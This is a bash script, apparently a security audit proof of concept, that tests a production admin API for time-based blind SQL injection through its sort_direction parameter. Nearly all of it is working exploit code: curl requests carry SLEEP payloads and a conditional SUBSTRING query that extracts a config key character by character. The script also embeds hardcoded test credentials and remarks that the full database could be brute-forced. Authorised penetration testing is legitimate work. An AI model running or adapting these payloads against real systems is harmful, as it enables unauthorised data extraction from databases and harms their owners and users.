#!/bin/bash
# Security audit: SQL injection proof-of-concept on prod
# Safe: read-only, no data modification

HOST="https://admin.ev-agency.io"
USER="sectest_audit_2026"
PASS="AuditTest123"
AUTH="$USER:$PASS"

echo "=== SHM Security Audit: SQL Injection via sort_direction ==="
echo "Target: $HOST"
echo ""

# 1. Baseline - normal request
echo "[1/4] Baseline request (sort_direction=asc)..."
START=$(date +%s%3N 2>/dev/null || python3 -c 'import time; print(int(time.time()*1000))')
RESP1=$(curl -s -u "$AUTH" "$HOST/shm/v1/user?sort_field=user_id&sort_direction=asc")
END=$(date +%s%3N 2>/dev/null || python3 -c 'import time; print(int(time.time()*1000))')
TIME1=$(( END - START ))
echo "  Response time: ${TIME1}ms"
echo "  Status: $(echo "$RESP1" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("status","?"))' 2>/dev/null)"
echo ""

# 2. Injection test - add extra column (should be accepted if vulnerable)
echo "[2/4] Injection: sort_direction=asc,user_id..."
START=$(date +%s%3N 2>/dev/null || python3 -c 'import time; print(int(time.time()*1000))')
RESP2=$(curl -s -u "$AUTH" "$HOST/shm/v1/user?sort_field=user_id&sort_direction=asc,user_id")
END=$(date +%s%3N 2>/dev/null || python3 -c 'import time; print(int(time.time()*1000))')
TIME2=$(( END - START ))
echo "  Response time: ${TIME2}ms"
echo "  Status: $(echo "$RESP2" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("status","?"))' 2>/dev/null)"
echo ""

# 3. SLEEP injection - 2 seconds (safe, no data touched)
echo "[3/4] SLEEP injection: sort_direction=asc,(SELECT SLEEP(2))..."
START=$(date +%s%3N 2>/dev/null || python3 -c 'import time; print(int(time.time()*1000))')
RESP3=$(curl -s -u "$AUTH" "$HOST/shm/v1/user?sort_field=user_id&sort_direction=asc,(SELECT+SLEEP(2))")
END=$(date +%s%3N 2>/dev/null || python3 -c 'import time; print(int(time.time()*1000))')
TIME3=$(( END - START ))
echo "  Response time: ${TIME3}ms"
echo "  Status: $(echo "$RESP3" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("status","?"))' 2>/dev/null)"
echo ""

# 4. Data extraction proof - first char of first config key
echo "[4/4] Data extraction: checking if first char of config key = 't'..."
START=$(date +%s%3N 2>/dev/null || python3 -c 'import time; print(int(time.time()*1000))')
RESP4=$(curl -s -u "$AUTH" "$HOST/shm/v1/user?sort_field=user_id&sort_direction=asc,IF(SUBSTRING((SELECT+\`key\`+FROM+configs+LIMIT+1),1,1)='t',SLEEP(2),0)")
END=$(date +%s%3N 2>/dev/null || python3 -c 'import time; print(int(time.time()*1000))')
TIME4=$(( END - START ))
echo "  Response time: ${TIME4}ms"
echo "  Status: $(echo "$RESP4" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("status","?"))' 2>/dev/null)"
echo ""

# Results
echo "=== RESULTS ==="
echo ""
echo "  Baseline:        ${TIME1}ms"
echo "  Extra column:    ${TIME2}ms"
echo "  SLEEP(2):        ${TIME3}ms"
echo "  Data extraction: ${TIME4}ms"
echo ""

if [ "$TIME3" -gt 1500 ]; then
    echo "  [VULNERABLE] SLEEP(2) caused ${TIME3}ms delay (expected ~2000ms+)"
    echo "  SQL injection CONFIRMED - arbitrary SQL executes in ORDER BY"
else
    echo "  [NOT VULNERABLE] SLEEP did not cause delay"
    echo "  Possible reasons: endpoint returns 0 rows, or injection is blocked"
fi

if [ "$TIME4" -gt 1500 ]; then
    echo "  [DATA LEAK] Config key starts with 't' - data extraction CONFIRMED"
elif [ "$TIME3" -gt 1500 ] && [ "$TIME4" -lt 1000 ]; then
    echo "  [DATA LEAK POSSIBLE] Config key does NOT start with 't', but SLEEP works"
    echo "  An attacker can brute-force all characters to extract full database"
fi

echo ""
echo "=== DONE ==="
